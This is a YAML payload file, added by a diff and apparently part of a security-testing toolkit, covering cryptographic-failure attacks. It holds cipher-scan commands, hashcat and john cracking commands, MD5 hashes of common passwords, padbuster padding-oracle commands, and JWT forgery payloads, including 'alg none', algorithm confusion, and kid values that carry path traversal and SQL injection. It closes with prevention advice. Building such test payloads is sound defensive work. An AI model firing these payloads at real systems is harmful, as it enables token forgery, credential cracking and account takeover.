@@ -1,0 +1,131 @@
+# A04:2025 - Cryptographic Failures Payloads
+# CWE-327: Use of a Broken or Risky Cryptographic Algorithm
+
+payload_category: "crypto-attacks"
+owasp_2025: "A04"
+cwe: "CWE-327"
+severity: "HIGH"
+
+# ===== WEAK CIPHER DETECTION =====
+weak_ciphers:
+  ssl_tls:
+    deprecated_protocols:
+      - "SSLv2"
+      - "SSLv3"
+      - "TLS 1.0"
+      - "TLS 1.1"
+
+    weak_cipher_suites:
+      - "DES-CBC3-SHA"
+      - "RC4-SHA"
+      - "RC4-MD5"
+      - "NULL-SHA"
+      - "NULL-MD5"
+      - "EXP-RC4-MD5"
+      - "EXP-DES-CBC-SHA"
+      - "ADH-RC4-MD5"
+      - "AECDH-NULL-SHA"
+
+    detection_commands:
+      - "nmap --script ssl-enum-ciphers -p 443 target.com"
+      - "sslscan target.com"
+      - "testssl.sh target.com"
+      - "openssl s_client -connect target.com:443 -ssl3"
+      - "openssl s_client -connect target.com:443 -tls1"
+
+# ===== HASH CRACKING =====
+hash_cracking:
+  weak_hashes:
+    md5:
+      - "hashcat -m 0 hashes.txt wordlist.txt"
+      - "john --format=raw-md5 hashes.txt"
+    sha1:
+      - "hashcat -m 100 hashes.txt wordlist.txt"
+    ntlm:
+      - "hashcat -m 1000 hashes.txt wordlist.txt"
+    mysql:
+      - "hashcat -m 300 hashes.txt wordlist.txt"
+
+  common_hashes_to_test:
+    - "5f4dcc3b5aa765d61d8327deb882cf99"
+    - "e10adc3949ba59abbe56e057f20f883e"
+    - "d8578edf8458ce06fbc5bb76a58c5ca4"
+    - "21232f297a57a5a743894a0e4a801fc3"
+    - "admin: 21232f297a57a5a743894a0e4a801fc3 (MD5)"
+    - "password: 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)"
+
+# ===== PADDING ORACLE =====
+padding_oracle:
+  detection:
+    - "Modify last byte of ciphertext and observe error"
+    - "Different error for invalid padding vs invalid data"
+    - "HTTP 500 for bad padding, HTTP 200/403 for valid padding"
+
+  tools:
+    - "padbuster http://target.com/page?token=ENCRYPTED_VALUE ENCRYPTED_VALUE 16"
+    - "padding-oracle-attacker -u http://target.com/page -c COOKIE_VALUE"
+
+# ===== SENSITIVE DATA EXPOSURE =====
+sensitive_data_checks:
+  cleartext_transmission:
+    - "Check for HTTP (not HTTPS) login pages"
+    - "Check for HTTP API endpoints transmitting tokens"
+    - "Check for unencrypted WebSocket (ws:// vs wss://)"
+    - "Check for FTP instead of SFTP"
+
+  hardcoded_secrets:
+    - "API keys in JavaScript source"
+    - "Database passwords in config files"
+    - "Private keys in source code"
+    - "AWS access keys in environment variables"
+    - "JWT secret in client-side code"
+
+  insecure_storage:
+    - "Passwords stored as MD5/SHA1 without salt"
+    - "Credit card numbers stored in plaintext"
+    - "PII stored without encryption"
+    - "Session tokens in local storage"
+
+# ===== JWT ATTACKS =====
+jwt_attacks:
+  none_algorithm:
+    - "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\"}.empty_signature"
+    - "{\"alg\":\"None\",\"typ\":\"JWT\"}"
+    - "{\"alg\":\"NONE\",\"typ\":\"JWT\"}"
+    - "{\"alg\":\"nOnE\",\"typ\":\"JWT\"}"
+
+  algorithm_confusion:
+    - "Change RS256 to HS256 and sign with public key"
+    - "{\"alg\":\"HS256\"} signed with RSA public key as HMAC secret"
+
+  weak_secret:
+    - "hashcat -m 16500 jwt.txt rockyou.txt"
+    - "john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256"
+
+  kid_injection:
+    - "{\"alg\":\"HS256\",\"kid\":\"../../../etc/passwd\"}"
+    - "{\"alg\":\"HS256\",\"kid\":\"/dev/null\"}"
+    - "{\"alg\":\"HS256\",\"kid\":\"key' UNION SELECT 'secret'--\"}"
+
+  claim_manipulation:
+    - "Change 'role' to 'admin'"
+    - "Change 'exp' to far future"
+    - "Change 'sub' to admin user"
+    - "Add 'admin: true'"
+
+prevention:
+  - "Use TLS 1.2+ with strong cipher suites"
+  - "Use bcrypt/scrypt/Argon2 for password hashing"
+  - "Never use MD5/SHA1 for security purposes"
+  - "Implement proper key management"
+  - "Rotate encryption keys regularly"
+  - "Use authenticated encryption (AES-GCM)"
+  - "Validate JWT algorithms server-side"
+  - "Use strong, random JWT secrets (256+ bits)"
+
+references:
+  - "OWASP Top 10:2025 A04"
+  - "CWE-327: Broken Crypto Algorithm"
+  - "CWE-328: Reversible One-Way Hash"
+  - "CWE-916: Insufficient Password Hash Complexity"
+  - "PayloadsAllTheThings: JWT"
